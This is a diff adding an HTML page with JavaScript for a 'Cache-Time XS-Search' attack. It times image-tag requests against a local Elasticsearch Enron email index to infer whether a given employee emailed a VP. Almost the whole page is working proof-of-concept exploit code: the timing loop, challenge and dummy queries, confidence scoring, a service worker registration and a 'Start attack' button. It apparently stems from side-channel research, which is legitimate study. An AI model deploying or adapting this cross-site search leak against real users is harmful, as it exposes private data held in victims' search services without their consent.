@@ -1,0 +1,119 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Cache-Time (CT) XS-Search</title>
+
+<script>
+
+var startTime = -1;
+var challengeSamples = [];
+var dummySamples = [];
+var attackStartTime = 0;
+
+var setSize = 25;
+var slot = 2500;
+
+var challengeReq = 'http://localhost:9200/enron/_search?source={%22query%22:{%22bool%22:{%22filter%22:[{%22term%22:{%22to%22:%22jeff.skilling@enron.com%22}},{%22term%22:{%22from_email%22:%22jeffrey.shankman@enron.com%22}}]}}}';
+
+var dummyReq = 'http://localhost:9200/enron/_search?source={"query":{"bool":{"filter":[{"term":{"to":"jeff.skilling@enron.com"}},{"term":{"from_email":"!!!!DummyNotExistEmail!!!!!@enron.com"}}]}}}'; 
+var dummyCounter = -1;
+var sampleSize = 1052;
+
+function measureDummyAndSendChallenge() {
+	dummyTime = performance.now()-startTime;
+	if (startTime != -1)
+		dummySamples.push(dummyTime);
+	
+	dummyCounter++;
+	
+	if (dummyCounter == slot && dummyCounter > 0)
+	{
+		analyzeTiming();
+		challengeSamples = [];
+		dummySamples = [];
+		dummyCounter = 0
+		return;
+		
+	}
+	
+	var s = document.createElement('img');
+	document.body.appendChild(s);
+	s.onerror = measureChallengeAndSendDummy;
+	s.onload = measureChallengeAndSendDummy;
+	startTime = performance.now();
+	s.src = challengeReq;
+	
+}
+
+function measureChallengeAndSendDummy() {
+	challengeTime = performance.now()-startTime;
+	challengeSamples.push(challengeTime);
+
+	var s = document.createElement('img');
+	document.body.appendChild(s);
+	s.onerror = measureDummyAndSendChallenge;
+	s.onload = measureDummyAndSendChallenge;
+	startTime = performance.now();
+	s.src = dummyReq;
+}
+
+function start() {
+	startTime = -1;
+	dummyCounter = -1;
+	attackStartTime = performance.now();
+	var basicReq = 'http://localhost:9200/enron/_search?source={"query":{"bool":{"filter":[{"term":{"from_email":"mark.schroeder@enron.com"}},{"term":{"to":"';
+	var query = encodeURI(document.getElementById("wordText").value);
+	challengeReq = basicReq + query + '"}}]}},"size":40}'
+	
+	//document.writeln("<table><tr><td>Challenge </td><td>Dummy </td></tr>");
+	measureDummyAndSendChallenge();
+}
+function analyzeTiming()
+{
+		attackTime = performance.now() - attackStartTime;
+		challengeIsTrue = 0;
+        for (i = 0; i < slot; i++)
+        {
+				if(challengeSamples[i] > dummySamples[i])
+					challengeIsTrue++;
+        }
+		
+		if (challengeIsTrue > slot*0.55)
+		{
+			str = "Confidence: " + challengeIsTrue*100/slot + "%. There is at least one result for the tested search request.";
+			str += "<br>The user: " + document.getElementById("wordText").value + " talked with the VP";
+		}
+		else
+		{
+			str = "Confidence: " + (100 - (challengeIsTrue*100/slot)) + "%. No search results were received for this search request.";
+			str += "<br>The user: " + document.getElementById("wordText").value + " did not talk with the VP";
+		}
+		str += "<br>Attack was completed within " + (attackTime/1000) + " seconds";
+		document.getElementById("resultsDiv").innerHTML = str;
+}
+
+function registerSW() {
+
+  navigator.serviceWorker.register('k1.js').then(function(registration) {
+    // Registration was successful
+    console.log('ServiceWorker registration successful with scope: ',    registration.scope);
+	document.getElementById("startButton").hidden = false;
+  }).catch(function(error) {
+		console.log(error);
+    });
+}
+</script>
+</head>
+<body onload="registerSW();">
+<h1>Welcome to Cache-Time (CT) XS-Search attack!</h1>
+<h2>Use this form to cross-site search in enron email history</h2>
+
+Type email of an Enron's employee to test whether or not they talked with the VP (Mark Schroeder mark.schroeder@enron.com):
+<br><input type="text" name="wordText" id="wordText" style="width:520px;" /><br>
+<br>
+<input type="button" id="startButton" value="Start attack" onclick="start();" hidden="true"/>
+<br>
+<br>
+<div id="resultsDiv"></div>
+</body>
+</html>
